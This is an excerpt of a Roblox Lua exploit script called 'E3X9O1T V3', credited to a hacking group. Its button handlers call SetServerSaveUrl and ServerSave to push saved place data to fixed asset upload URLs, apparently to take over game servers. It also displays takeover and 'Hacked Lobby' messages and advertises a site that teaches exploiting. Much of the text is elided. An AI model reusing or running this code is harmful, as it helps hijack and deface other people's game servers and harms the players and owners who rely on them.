--------------------------------------------------------------- E3X9O1T V3  -------------------------------------------------------------------------
-- Credits to --
-- CrazeX (Hung999) - Project Leader
-- Moap -- - Ideas
-- Epidemeus -- - Addition Features
--  xXxXIKillYaxXxX -- - Infection Lobby
-- The Rest Of GOG for support and ideas --
--------------------------------------------------------------- E3X9O1T V3  -------------------------------------------------------------------------
...
textlabel.Text = "Darkgamer1003 || By Max || Drag This Bar"
...
coroutine.resume(coroutine.create(function()
    game:SetServerSaveUrl("http://www.roblox.com/Data/Upload.ashx?assetid=71074928")
    game:ServerSave()
      end))
end)
...
IL.Text="To learn to exploit like this Join thegreenlab.co.cc (Its a website)This server has been tooken over by "..game.Players.LocalPlayer.Name
...
aadddc.MouseButton1Down:connect(function()
coroutine.resume(coroutine.create(function()
    game:SetServerSaveUrl("http://www.roblox.com/Data/Upload.ashx?assetid=71074908")
    game:ServerSave()
      end))
end)
...
but.BorderColor3=BrickColor.new("White").Color
but.TextColor3=BrickColor.new("White").Color
but.Text="Hacked Lobby By DangCool and Hung999 Hosted By "..game.Players.LocalPlayer.Name
